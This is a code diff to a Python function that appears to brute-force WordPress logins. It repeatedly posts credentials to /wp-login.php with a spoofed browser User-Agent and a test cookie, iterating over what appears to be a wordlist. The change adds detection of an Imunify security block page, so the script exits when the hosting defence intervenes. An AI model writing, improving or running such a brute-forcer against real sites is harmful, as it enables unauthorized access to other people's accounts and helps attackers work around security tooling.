@@ -79,7 +79,11 @@ def wpbf(url: str, usr='a', pw='a', path='/wp-login.php'):
             r = requests.post(url, data=data, allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'Cookie': 'wordpress_test_cookie=WP Cookie check'})
         dataa = r.text
         if r.status_code == 404:
-            exit('\nURL NOT FOUND - STATUS CODE: 404')
+            if 'reset-password' in r.text:
+                exit('Imunify ALert')
+            else:
+                exit('\nURL NOT FOUND - STATUS CODE: 404')
+            
         count += 1
         if count > len(garis):
               print("\n"+target + " Is Done")
